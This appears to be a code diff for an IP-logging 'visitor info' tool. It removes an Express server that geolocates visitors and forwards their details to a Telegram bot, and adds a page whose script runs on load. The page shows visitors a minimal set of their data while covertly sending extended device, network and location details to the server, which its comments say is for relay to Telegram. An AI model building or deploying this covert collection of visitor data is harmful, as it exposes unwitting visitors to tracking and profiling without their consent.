@@ -1,98 +1,180 @@
-// server.js
-const express = require('express');
-const axios = require('axios');
-const cors = require('cors');
-const useragent = require('express-useragent');
-const requestIp = require('request-ip');
-require('dotenv').config();
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Visitor Info</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
 
-const app = express();
-const port = process.env.PORT || 3000;
-
-app.use(cors());
-app.use(express.json());
-app.use(useragent.express());
-app.use(requestIp.mw());
-
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-
-if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-  console.error('⚠️ TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is missing!');
-  process.exit(1);
-}
-
-app.use(express.static('public'));
-
-const axiosTelegramSend = async (text) => {
-  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-  try {
-    await axios.post(url, {
-      chat_id: TELEGRAM_CHAT_ID,
-      text,
-      parse_mode: 'Markdown'
-    });
-  } catch (error) {
-    console.error('Telegram send error:', error.message);
-  }
-};
-
-app.get('/collect', async (req, res) => {
-  let ip = req.clientIp || '';
-  if (req.headers['x-forwarded-for']) {
-    ip = req.headers['x-forwarded-for'].split(',')[0].trim();
-  }
-  const ua = req.useragent || {};
-  const browser = ua.browser || 'Unknown';
-  const os = ua.os || 'Unknown';
-  const device = ua.platform || 'Unknown';
-
-  let country = 'Unknown';
-  let city = 'Unknown';
-
-  try {
-    const geo = await axios.get(`http://ip-api.com/json/${ip}`);
-    if (geo.data) {
-      country = geo.data.country || country;
-      city = geo.data.city || city;
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
     }
-  } catch (err) {
-    console.error('Geo API error:', err.message);
-  }
 
-  res.json({ ip, browser, os, device, country, city, vpn: false });
-});
+    html, body {
+      width: 100%;
+      height: 100%;
+      background: #0c0c0c;
+      color: #ccc;
+      font-family: 'Share Tech Mono', monospace;
+      overflow: hidden;
+    }
 
-app.post('/clientinfo', async (req, res) => {
-  try {
-    const {
-      ip, browser, os, device, country, city, vpn,
-      timestamp, resolution, useragent, deviceType, networkType, cookies
-    } = req.body;
+    .container {
+      display: flex;
+      height: 100vh;
+      width: 100vw;
+    }
 
-    const message = `New visitor:
-IP: ${ip}
-Browser: ${browser}
-OS: ${os}
-Device: ${device}
-Country: ${country}
-City: ${city}
-Timestamp: ${timestamp}
-Screen Resolution: ${resolution}
-User-Agent: ${useragent}
-Device Type: ${deviceType}
-Network Type: ${networkType}
-Cookies Enabled: ${cookies}
-VPN: ${vpn ? 'Yes' : 'No'}`;
+    .left {
+      flex: 1;
+      background: #111;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
 
-    await axiosTelegramSend(message);
-    res.json({ success: true });
-  } catch (error) {
-    console.error('Error /clientinfo:', error);
-    res.status(500).json({ success: false, error: error.message });
-  }
-});
+    .left img {
+      max-width: 90%;
+      max-height: 90%;
+      object-fit: contain;
+      filter: brightness(1) drop-shadow(0 0 20px rgba(255,255,255,0.4));
+    }
 
-app.listen(port, () => {
-  console.log(`Server running on port ${port}`);
-});
+    .right {
+      flex: 1;
+      padding: 60px 40px;
+      background: #0c0c0c;
+      border-left: 1px solid #333;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+
+    .title {
+      font-size: 28px;
+      color: #fff;
+      margin-bottom: 30px;
+    }
+
+    .info {
+      display: grid;
+      grid-template-columns: auto 1fr;
+      row-gap: 16px;
+      column-gap: 20px;
+    }
+
+    .label {
+      color: #888;
+      text-align: right;
+      font-size: 16px;
+    }
+
+    .value {
+      color: #6eeeff;
+      font-size: 16px;
+      text-align: left;
+      word-break: break-word;
+    }
+
+    @media (max-width: 800px) {
+      .container {
+        flex-direction: column;
+      }
+      .left, .right {
+        flex: none;
+        width: 100%;
+        height: 50%;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="left">
+      <img src="https://i.imgur.com/SB1nEwT.png" alt="Image" />
+    </div>
+    <div class="right">
+      <div class="title">New visitor:</div>
+      <div class="info">
+        <div class="label">IP:</div> <div class="value" id="ip">Loading...</div>
+        <div class="label">Browser:</div> <div class="value" id="browser">Loading...</div>
+        <div class="label">OS:</div> <div class="value" id="os">Loading...</div>
+        <div class="label">Device:</div> <div class="value" id="device">Loading...</div>
+        <div class="label">Country:</div> <div class="value" id="country">Loading...</div>
+        <div class="label">City:</div> <div class="value" id="city">Loading...</div>
+        <div class="label">VPN:</div> <div class="value" id="vpn">Loading...</div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    window.addEventListener('DOMContentLoaded', () => {
+      fetch('/collect')
+        .then(res => res.json())
+        .then(data => {
+          // Отображаем на сайте только минимальный набор
+          document.getElementById('ip').textContent = data.ip || 'Unknown';
+          document.getElementById('browser').textContent = data.browser || 'Unknown';
+          document.getElementById('os').textContent = data.os || 'Unknown';
+          document.getElementById('device').textContent = data.device || 'Unknown';
+          document.getElementById('country').textContent = data.country || 'Unknown';
+          document.getElementById('city').textContent = data.city || 'Unknown';
+          document.getElementById('vpn').textContent = data.vpn ? 'Yes' : 'No';
+
+          // Собираем расширенную инфу для отправки на сервер
+          const timestamp = new Date().toLocaleString();
+          const resolution = `${window.screen.width} x ${window.screen.height}`;
+          const useragent = navigator.userAgent;
+          const ua = navigator.userAgent.toLowerCase();
+          const isMobile = /mobile|android|iphone|ipad|phone/i.test(ua);
+          const deviceType = isMobile ? 'Mobile' : 'Desktop';
+          let networkType = 'Unknown';
+          if (navigator.connection && navigator.connection.effectiveType) {
+            networkType = navigator.connection.effectiveType;
+          }
+          const cookies = navigator.cookieEnabled ? 'Yes' : 'No';
+
+          const fullData = {
+            ip: data.ip || 'Unknown',
+            browser: data.browser || 'Unknown',
+            os: data.os || 'Unknown',
+            device: data.device || 'Unknown',
+            country: data.country || 'Unknown',
+            city: data.city || 'Unknown',
+            vpn: data.vpn || false,
+            timestamp,
+            resolution,
+            useragent,
+            deviceType,
+            networkType,
+            cookies
+          };
+
+          // Отправляем данные на сервер для отправки в Телеграм
+          fetch('/clientinfo', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(fullData)
+          })
+          .then(response => response.json())
+          .then(result => {
+            if (result.success) {
+              console.log('Telegram message sent');
+            } else {
+              console.error('Failed to send Telegram message:', result.error);
+            }
+          })
+          .catch(err => {
+            console.error('Error sending data to server:', err);
+          });
+        })
+        .catch(err => {
+          console.error('Error fetching /collect:', err);
+        });
+    });
+  </script>
+</body>
+</html>
